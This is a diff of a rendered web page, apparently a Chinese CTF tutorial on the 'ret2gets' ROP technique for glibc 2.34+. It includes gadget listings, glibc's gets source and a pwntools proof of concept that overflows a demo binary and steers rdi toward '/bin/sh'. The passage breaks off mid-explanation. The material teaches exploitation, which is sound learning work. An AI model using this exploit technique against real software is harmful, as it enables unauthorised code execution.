+</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39"></a>0x0000000000401136<span class="w"> </span>:<span class="w"> </span>mov<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rip<span class="w"> </span>+<span class="w"> </span>0x2efb<span class="o">]</span>,<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>pop<span class="w"> </span>rbp<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40"></a>0x0000000000401182<span class="w"> </span>:<span class="w"> </span>mov<span class="w"> </span>eax,<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>leave<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41"></a>0x00000000004010c7<span class="w"> </span>:<span class="w"> </span>mov<span class="w"> </span>edi,<span class="w"> </span>0x404038<span class="w"> </span><span class="p">;</span><span class="w"> </span>jmp<span class="w"> </span>rax
+</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42"></a>0x00000000004010cf<span class="w"> </span>:<span class="w"> </span>nop<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43"></a>0x000000000040114c<span class="w"> </span>:<span class="w"> </span>nop<span class="w"> </span>dword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rax<span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>endbr64<span class="w"> </span><span class="p">;</span><span class="w"> </span>jmp<span class="w"> </span>0x4010e0
+</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44"></a>0x00000000004010c6<span class="w"> </span>:<span class="w"> </span>or<span class="w"> </span>dword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rdi<span class="w"> </span>+<span class="w"> </span>0x404038<span class="o">]</span>,<span class="w"> </span>edi<span class="w"> </span><span class="p">;</span><span class="w"> </span>jmp<span class="w"> </span>rax
+</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45"></a>0x000000000040113d<span class="w"> </span>:<span class="w"> </span>pop<span class="w"> </span>rbp<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46"></a>0x000000000040101a<span class="w"> </span>:<span class="w"> </span>ret
+</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47"></a>0x0000000000401011<span class="w"> </span>:<span class="w"> </span>sal<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rdx<span class="w"> </span>+<span class="w"> </span>rax<span class="w"> </span>-<span class="w"> </span><span class="m">1</span><span class="o">]</span>,<span class="w"> </span>0xd0<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48"></a>0x0000000000401138<span class="w"> </span>:<span class="w"> </span>sti<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>byte<span class="w"> </span>ptr<span class="w"> </span>cs:<span class="o">[</span>rax<span class="o">]</span>,<span class="w"> </span>al<span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>dword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rbp<span class="w"> </span>-<span class="w"> </span>0x3d<span class="o">]</span>,<span class="w"> </span>ebx<span class="w"> </span><span class="p">;</span><span class="w"> </span>nop<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49"></a>0x0000000000401191<span class="w"> </span>:<span class="w"> </span>sub<span class="w"> </span>esp,<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50"></a>0x0000000000401190<span class="w"> </span>:<span class="w"> </span>sub<span class="w"> </span>rsp,<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>add<span class="w"> </span>rsp,<span class="w"> </span><span class="m">8</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51"></a>0x0000000000401010<span class="w"> </span>:<span class="w"> </span><span class="nb">test</span><span class="w"> </span>eax,<span class="w"> </span>eax<span class="w"> </span><span class="p">;</span><span class="w"> </span>je<span class="w"> </span>0x401016<span class="w"> </span><span class="p">;</span><span class="w"> </span>call<span class="w"> </span>rax
+</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52"></a>0x00000000004010c3<span class="w"> </span>:<span class="w"> </span><span class="nb">test</span><span class="w"> </span>eax,<span class="w"> </span>eax<span class="w"> </span><span class="p">;</span><span class="w"> </span>je<span class="w"> </span>0x4010d0<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>edi,<span class="w"> </span>0x404038<span class="w"> </span><span class="p">;</span><span class="w"> </span>jmp<span class="w"> </span>rax
+</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53"></a>0x0000000000401105<span class="w"> </span>:<span class="w"> </span><span class="nb">test</span><span class="w"> </span>eax,<span class="w"> </span>eax<span class="w"> </span><span class="p">;</span><span class="w"> </span>je<span class="w"> </span>0x401110<span class="w"> </span><span class="p">;</span><span class="w"> </span>mov<span class="w"> </span>edi,<span class="w"> </span>0x404038<span class="w"> </span><span class="p">;</span><span class="w"> </span>jmp<span class="w"> </span>rax
+</span><span id="__span-1-54"><a id="__codelineno-1-54" name="__codelineno-1-54"></a>0x000000000040100f<span class="w"> </span>:<span class="w"> </span><span class="nb">test</span><span class="w"> </span>rax,<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>je<span class="w"> </span>0x401016<span class="w"> </span><span class="p">;</span><span class="w"> </span>call<span class="w"> </span>rax
+</span><span id="__span-1-55"><a id="__codelineno-1-55" name="__codelineno-1-55"></a>
+</span><span id="__span-1-56"><a id="__codelineno-1-56" name="__codelineno-1-56"></a>Unique<span class="w"> </span>gadgets<span class="w"> </span>found:<span class="w"> </span><span class="m">51</span>
+</span></code></pre></div></td></tr></table></div>
 <p>什么都看不到，缺的往往还不只是 <code>pop rdi ; ret</code>，很多平时很眼熟的 gadget 也会一起消失。</p>
-<h3 id="pop-rdi-ret"><code>pop rdi ; ret</code> 平时从哪里来</h3>
+<h3 id="pop-rdi-ret"><code>pop rdi ; ret</code> 平时从哪里来<a class="headerlink" href="#pop-rdi-ret" title="Permanent link">&para;</a></h3>
 <p>在很多老一些的题目里，最常见的 <code>pop rdi ; ret</code> 来源其实并不是某段“专门给利用者准备好的代码”，而是 <code>__libc_csu_init</code> 里的 <code>pop r15 ; ret</code>。由于 x86 指令是变长的，从中间一个字节开始执行时，会得到新的指令解释：</p>
-<pre><code class="language-text">pop r15 ; ret = 41 5f c3
-pop rdi ; ret =    5f c3
-</code></pre>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
+<span class="normal"><a href="#__codelineno-2-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>pop r15 ; ret = 41 5f c3
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>pop rdi ; ret =    5f c3
+</span></code></pre></div></td></tr></table></div>
 <p>也就是说，只要有 <code>pop r15 ; ret</code>，从第二个字节开始执行，就会得到一个 <code>pop rdi ; ret</code>。而过去的 <code>__libc_csu_init</code> 往往恰好带着这样一串 <code>pop</code>，于是很多很短的小程序也能白拿到一套相当顺手的 gadget。</p>
-<h3 id="glibc-234">为什么它在 <code>glibc 2.34+</code> 里突然不见了</h3>
-<p>问题出在 <code>glibc 2.34</code> 之后的启动代码调整。glibc 有一处 <a href="https://sourceware.org/pipermail/libc-alpha/2021-February/122794.html">patch</a>{target="_blank" rel="noopener"} 停止把 <code>__libc_csu_init</code> 编进新二进制里，原本很多题里最常见的 gadget 来源也就跟着一起消失了。</p>
+<h3 id="glibc-234">为什么它在 <code>glibc 2.34+</code> 里突然不见了<a class="headerlink" href="#glibc-234" title="Permanent link">&para;</a></h3>
+<p>问题出在 <code>glibc 2.34</code> 之后的启动代码调整。glibc 有一处 <a href="https://sourceware.org/pipermail/libc-alpha/2021-February/122794.html" rel="noopener" target="_blank">patch</a> 停止把 <code>__libc_csu_init</code> 编进新二进制里，原本很多题里最常见的 gadget 来源也就跟着一起消失了。</p>
 <p>于是就会出现一个很尴尬的局面：程序明明有溢出，也有 <code>puts@plt</code> 和 GOT 这些熟悉的利用点，但真正开始拼链的时候，却发现连 <code>pop rdi ; ret</code> 都没有，经典 ret2plt 思路直接卡在第一步。</p>
 <p>拿到 libc 泄漏之后，libc 本体里通常还是能找到 <code>pop rdi ; ret</code>。但问题恰恰就在“还没有 leak 之前”的这一步，程序本体里的 gadget 可能已经差到连第一轮泄漏都做不出来。</p>
 <p><code>ret2gets</code> 要解决的正是这个空档。它并不是为了取代所有 ROP 技巧，而是在“程序本体里 gadget 很差、又还没拿到 libc 泄漏”的时候，先想办法把 <code>rdi</code> 控出来。只要这一步解决，后面的很多事情就都能继续往下做。</p>
-<h2 id="gets">问题回到 <code>gets</code> 本身</h2>
+<h2 id="gets">问题回到 <code>gets</code> 本身<a class="headerlink" href="#gets" title="Permanent link">&para;</a></h2>
 <p>上面这个程序真正有意思的地方在于：在 <code>gdb</code> 里跑起来，随便输一串东西，再去看 <code>gets</code> 返回前后的寄存器，就会发现 <code>rdi</code> 的值不太对劲。</p>
 <p>它并不是还指向一开始传进去的 <code>buf</code>，而是跑到了一个叫 <code>_IO_stdfile_0_lock</code> 的地方去。</p>
 <p>这里先记住一件事即可：</p>
@@ -1769,102 +1953,156 @@ pop rdi ; ret =    5f c3
 <p><code>_IO_stdfile_0_lock</code> 在 libc 的可写区域里。</p>
 </blockquote>
 <p>光这一点，就已经足够让人起兴趣了。</p>
-<h2 id="_io_stdfile_0_lock"><code>_IO_stdfile_0_lock</code> 是什么东西</h2>
-<p>如果去看 glibc 里 <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/iogets.c#L31"><code>gets</code></a>{target="_blank" rel="noopener"} 的实现，会发现它并不是单纯地读入一串数据那么简单。作为标准 IO 的一部分，它开头会通过 <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L88"><code>_IO_acquire_lock</code></a>{target="_blank" rel="noopener"} 锁住 <code>stdin</code>，结束前再把锁释放掉。</p>
-<pre><code class="language-c">char *
-_IO_gets (char *buf)
-{
-  size_t count;
-  int ch;
-  char *retval;
-
-  _IO_acquire_lock (stdin);
-  ch = _IO_getc_unlocked (stdin);
-  if (ch == EOF)
-    {
-      retval = NULL;
-      goto unlock_return;
-    }
-  if (ch == '\n')
-    count = 0;
-  else
-    {
-      /* This is very tricky since a file descriptor may be in the
-     non-blocking mode. The error flag doesn't mean much in this
-     case. We return an error only when there is a new error. */
-      int old_error = stdin-&gt;_flags &amp; _IO_ERR_SEEN;
-      stdin-&gt;_flags &amp;= ~_IO_ERR_SEEN;
-      buf[0] = (char) ch;
-      count = _IO_getline (stdin, buf + 1, INT_MAX, '\n', 0) + 1;
-      if (stdin-&gt;_flags &amp; _IO_ERR_SEEN)
-    {
-    retval = NULL;
-    goto unlock_return;
-    }
-      else
-    stdin-&gt;_flags |= old_error;
-    }
-  buf[count] = 0;
-  retval = buf;
-unlock_return:
-  _IO_release_lock (stdin);
-  return retval;
-}
-</code></pre>
+<h2 id="_io_stdfile_0_lock"><code>_IO_stdfile_0_lock</code> 是什么东西<a class="headerlink" href="#_io_stdfile_0_lock" title="Permanent link">&para;</a></h2>
+<p>如果去看 glibc 里 <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/iogets.c#L31" rel="noopener" target="_blank"><code>gets</code></a> 的实现，会发现它并不是单纯地读入一串数据那么简单。作为标准 IO 的一部分，它开头会通过 <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L88" rel="noopener" target="_blank"><code>_IO_acquire_lock</code></a> 锁住 <code>stdin</code>，结束前再把锁释放掉。</p>
+<div class="language-c highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">C</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-3-10">10</a></span>
+<span class="normal"><a href="#__codelineno-3-11">11</a></span>
+<span class="normal"><a href="#__codelineno-3-12">12</a></span>
+<span class="normal"><a href="#__codelineno-3-13">13</a></span>
+<span class="normal"><a href="#__codelineno-3-14">14</a></span>
+<span class="normal"><a href="#__codelineno-3-15">15</a></span>
+<span class="normal"><a href="#__codelineno-3-16">16</a></span>
+<span class="normal"><a href="#__codelineno-3-17">17</a></span>
+<span class="normal"><a href="#__codelineno-3-18">18</a></span>
+<span class="normal"><a href="#__codelineno-3-19">19</a></span>
+<span class="normal"><a href="#__codelineno-3-20">20</a></span>
+<span class="normal"><a href="#__codelineno-3-21">21</a></span>
+<span class="normal"><a href="#__codelineno-3-22">22</a></span>
+<span class="normal"><a href="#__codelineno-3-23">23</a></span>
+<span class="normal"><a href="#__codelineno-3-24">24</a></span>
+<span class="normal"><a href="#__codelineno-3-25">25</a></span>
+<span class="normal"><a href="#__codelineno-3-26">26</a></span>
+<span class="normal"><a href="#__codelineno-3-27">27</a></span>
+<span class="normal"><a href="#__codelineno-3-28">28</a></span>
+<span class="normal"><a href="#__codelineno-3-29">29</a></span>
+<span class="normal"><a href="#__codelineno-3-30">30</a></span>
+<span class="normal"><a href="#__codelineno-3-31">31</a></span>
+<span class="normal"><a href="#__codelineno-3-32">32</a></span>
+<span class="normal"><a href="#__codelineno-3-33">33</a></span>
+<span class="normal"><a href="#__codelineno-3-34">34</a></span>
+<span class="normal"><a href="#__codelineno-3-35">35</a></span>
+<span class="normal"><a href="#__codelineno-3-36">36</a></span>
+<span class="normal"><a href="#__codelineno-3-37">37</a></span>
+<span class="normal"><a href="#__codelineno-3-38">38</a></span>
+<span class="normal"><a href="#__codelineno-3-39">39</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="kt">char</span><span class="w"> </span><span class="o">*</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="nf">_IO_gets</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">)</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="p">{</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">count</span><span class="p">;</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a><span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">ch</span><span class="p">;</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a><span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">retval</span><span class="p">;</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7"></a>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8"></a><span class="w">  </span><span class="n">_IO_acquire_lock</span><span class="w"> </span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9"></a><span class="w">  </span><span class="n">ch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_IO_getc_unlocked</span><span class="w"> </span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ch</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">EOF</span><span class="p">)</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11"></a><span class="w">    </span><span class="p">{</span>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12"></a><span class="w">      </span><span class="n">retval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13"></a><span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">unlock_return</span><span class="p">;</span>
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ch</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">)</span>
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16"></a><span class="w">    </span><span class="n">count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17"></a><span class="w">  </span><span class="k">else</span>
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18"></a><span class="w">    </span><span class="p">{</span>
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19"></a><span class="w">      </span><span class="cm">/* This is very tricky since a file descriptor may be in the</span>
+</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20"></a><span class="cm">     non-blocking mode. The error flag doesn&#39;t mean much in this</span>
+</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21"></a><span class="cm">     case. We return an error only when there is a new error. */</span>
+</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22"></a><span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">old_error</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stdin</span><span class="o">-&gt;</span><span class="n">_flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
+</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23"></a><span class="w">      </span><span class="n">stdin</span><span class="o">-&gt;</span><span class="n">_flags</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="o">~</span><span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
+</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24"></a><span class="w">      </span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="n">ch</span><span class="p">;</span>
+</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25"></a><span class="w">      </span><span class="n">count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_IO_getline</span><span class="w"> </span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">INT_MAX</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26"></a><span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">stdin</span><span class="o">-&gt;</span><span class="n">_flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">_IO_ERR_SEEN</span><span class="p">)</span>
+</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27"></a><span class="w">    </span><span class="p">{</span>
+</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28"></a><span class="w">    </span><span class="n">retval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29"></a><span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">unlock_return</span><span class="p">;</span>
+</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31"></a><span class="w">      </span><span class="k">else</span>
+</span><span id="__span-3-32"><a id="__codelineno-3-32" name="__codelineno-3-32"></a><span class="w">    </span><span class="n">stdin</span><span class="o">-&gt;</span><span class="n">_flags</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="n">old_error</span><span class="p">;</span>
+</span><span id="__span-3-33"><a id="__codelineno-3-33" name="__codelineno-3-33"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-3-34"><a id="__codelineno-3-34" name="__codelineno-3-34"></a><span class="w">  </span><span class="n">buf</span><span class="p">[</span><span class="n">count</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+</span><span id="__span-3-35"><a id="__codelineno-3-35" name="__codelineno-3-35"></a><span class="w">  </span><span class="n">retval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buf</span><span class="p">;</span>
+</span><span id="__span-3-36"><a id="__codelineno-3-36" name="__codelineno-3-36"></a><span class="nl">unlock_return</span><span class="p">:</span>
+</span><span id="__span-3-37"><a id="__codelineno-3-37" name="__codelineno-3-37"></a><span class="w">  </span><span class="n">_IO_release_lock</span><span class="w"> </span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+</span><span id="__span-3-38"><a id="__codelineno-3-38" name="__codelineno-3-38"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">retval</span><span class="p">;</span>
+</span><span id="__span-3-39"><a id="__codelineno-3-39" name="__codelineno-3-39"></a><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div>
 <p>glibc 的标准 IO 为了支持多线程，很多时候都会给 <code>FILE</code> 结构加锁。比如 <code>stdin</code>、<code>stdout</code> 这些流，不可能让多个线程随便一起改，所以它们内部会带一个锁对象。</p>
-<p><code>stdin</code> 这个 <code>FILE</code> 结构里有一个 <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/struct_FILE.h#L81"><code>_lock</code></a>{target="_blank" rel="noopener"} 指针，而它指向的是一个 <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L26"><code>_IO_lock_t</code></a>{target="_blank" rel="noopener"} 结构：</p>
-<pre><code class="language-c">typedef struct { int lock; int cnt; void *owner; } _IO_lock_t;
-</code></pre>
+<p><code>stdin</code> 这个 <code>FILE</code> 结构里有一个 <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/struct_FILE.h#L81" rel="noopener" target="_blank"><code>_lock</code></a> 指针，而它指向的是一个 <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L26" rel="noopener" target="_blank"><code>_IO_lock_t</code></a> 结构：</p>
+<div class="language-c highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">C</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">lock</span><span class="p">;</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">cnt</span><span class="p">;</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">owner</span><span class="p">;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="n">_IO_lock_t</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>对标准输入来说，这个 <code>_lock</code> 指针通常就会指到 <code>_IO_stdfile_0_lock</code>。</p>
-<p>这里不把 glibc 的锁宏一层层全展开，我们只需要知道和利用直接相关的一句话——在常见的 <code>x86_64</code>、<code>glibc 2.30+</code> 环境下，<code>gets</code> 快返回时会走到 <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L67"><code>_IO_lock_unlock</code></a>{target="_blank" rel="noopener"} 这段解锁逻辑，而这段逻辑会把 <code>stdin-&gt;_lock</code> 装进 <code>rdi</code>，然后函数直接返回。</p>
+<p>这里不把 glibc 的锁宏一层层全展开，我们只需要知道和利用直接相关的一句话——在常见的 <code>x86_64</code>、<code>glibc 2.30+</code> 环境下，<code>gets</code> 快返回时会走到 <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L67" rel="noopener" target="_blank"><code>_IO_lock_unlock</code></a> 这段解锁逻辑，而这段逻辑会把 <code>stdin-&gt;_lock</code> 装进 <code>rdi</code>，然后函数直接返回。</p>
 <p>于是就得到这样一个结果：</p>
-<pre><code class="language-text">rdi = _IO_stdfile_0_lock
-</code></pre>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>rdi = _IO_stdfile_0_lock
+</span></code></pre></div></td></tr></table></div>
 <p>这就是 <code>ret2gets</code> 的出发点。</p>
 <p>如果一次 <code>gets</code> 返回以后，<code>rdi</code> 指向的是 <code>_IO_stdfile_0_lock</code>，那下一步自然就是再调用一次 <code>gets</code>。</p>
 <p>这样一来，第二次调用就等价于：</p>
-<pre><code class="language-c">gets(_IO_stdfile_0_lock);
-</code></pre>
+<div class="language-c highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">C</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="n">gets</span><span class="p">(</span><span class="n">_IO_stdfile_0_lock</span><span class="p">);</span>
+</span></code></pre></div></td></tr></table></div>
 <p>这意味着输入不再写到栈上，而是写进了 libc 这块可写区域里。更重要的是，第二次 <code>gets</code> 返回以后，<code>rdi</code> 依然会停在这里。于是就得到一个非常实用的效果：</p>
 <blockquote>
 <p>第二次 <code>gets</code> 写进去什么，返回时 <code>rdi</code> 就会指向什么。</p>
 </blockquote>
 <p>对于习惯了“必须先找 <code>pop rdi; ret</code> 才能往下做”的利用路径来说，这里相当于 <code>gets</code> 自己补出了一个可控的一参。</p>
-<h2 id="demo-rdi">最小 demo 证明 <code>rdi</code> 确实可控</h2>
+<h2 id="demo-rdi">最小 demo 证明 <code>rdi</code> 确实可控<a class="headerlink" href="#demo-rdi" title="Permanent link">&para;</a></h2>
 <p>不妨先用一个更小、更干净的 demo 来验证 <code>gets</code> 返回后，<code>rdi</code> 已经指向了目标字符串。</p>
 <p>POC 如下：</p>
-<p>```python title="exp.py"
-from pwn import *</p>
-<p>context.log_level = "debug"
-elf = context.binary = ELF("./demo")
-p = process()</p>
-<p>payload = b"A" * 0x20
-payload += p64(0)  # saved rbp
-payload += p64(elf.plt.gets)  # ret -&gt; gets@plt</p>
-<p>p.sendlineafter(b"ROP me if you can!\n", payload)</p>
-<p>pause()
-p.sendline(b"/bin" + p8(ord("/") + 1) + b"sh")</p>
-<p>p.interactive()</p>
-<pre><code>
-这段脚本里最容易让人困惑的地方就是最后一行输入。为什么不直接发一个 `/bin/sh`，而要写成这样？
-
-原因在于 `_IO_stdfile_0_lock` 并不是普通字符串缓冲区，它前 8 个字节对应的是：
-
-```text
-lock | cnt
-</code></pre>
